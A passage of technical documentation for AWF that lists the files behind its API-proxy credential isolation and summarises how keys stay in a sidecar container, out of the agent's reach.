| `containers/api-proxy/oidc-token-provider.js` | Azure AD token exchange via workload identity federation |
| `containers/api-proxy/aws-oidc-token-provider.js`, `aws-sigv4.js` | AWS STS AssumeRoleWithWebIdentity exchange and Bedrock Runtime SigV4 signing |
| `containers/api-proxy/gcp-oidc-token-provider.js` | GCP STS token exchange + optional SA impersonation |
| `containers/api-proxy/anthropic-oidc-token-provider.js` | Anthropic OAuth token exchange for workload identity federation |
| `containers/api-proxy/providers/openai.js` | OpenAI adapter — selects OIDC provider based on `AWF_AUTH_PROVIDER` |
| `containers/api-proxy/providers/anthropic.js` | Anthropic adapter — static `x-api-key` or WIF `Authorization: Bearer` |
| `containers/api-proxy/providers/copilot.js`, `copilot-auth.js`, `copilot-byok.js` | Copilot adapter — GitHub token, BYOK, and OIDC handling, `token`/`Bearer` prefix logic |
| `containers/api-proxy/providers/gemini.js`, `vertex.js`, `google-adapter.js`, `google-provider-specs.js` | Gemini and Vertex AI adapters (declarative specs) — static `x-goog-api-key` only, no OIDC |
| `containers/agent/setup-iptables.sh` | iptables rules for api-proxy routing |
| `containers/agent/entrypoint.sh` | Entrypoint token cleanup, capability drop |
| `containers/agent/api-proxy-health-check.sh` | Pre-flight credential isolation verification |
| `containers/agent/one-shot-token/` | LD_PRELOAD library for token protection |
| `docs/api-proxy-sidecar.md` | User-facing API proxy documentation |
| `docs/token-unsetting-fix.md` | Token cleanup implementation details |

## Summary

AWF implements **credential isolation** through architectural separation:

1. **API keys live in api-proxy container only** (never in agent environment)
2. **Agent uses standard SDK environment variables** (`*_BASE_URL`) to redirect traffic
3. **API proxy injects credentials** and routes through Squid
4. **Squid routes sidecar traffic** (the trusted sidecar is exempt from domain ACLs)
5. **iptables enforces network isolation** (agent cannot bypass proxy)
6. **Multiple token cleanup mechanisms** protect other credentials (GitHub tokens, etc.)

This architecture provides **transparent operation** (SDKs work without code changes) while maintaining **strong security** (compromised agent cannot steal API keys).

## Related documentation

- [Auth Doctor Updater workflow](../.github/workflows/auth-doctor-updater.md) — recurring audit of authentication and API-proxy documentation against implementation and official guidance
- [Auth Matrix](./auth-matrix.md) — per-provider auth combination reference (static keys, OIDC, custom headers)
- [API Proxy Sidecar](./api-proxy-sidecar.md) — user-facing guide for enabling the API proxy
- [Security](./security.md) — overall security model
- [Architecture](./architecture.md) — overall system architecture
- [Token Unsetting Fix](./token-unsetting-fix.md) — token cleanup implementation details
- [Environment Variables](./environment.md) — environment variable configuration
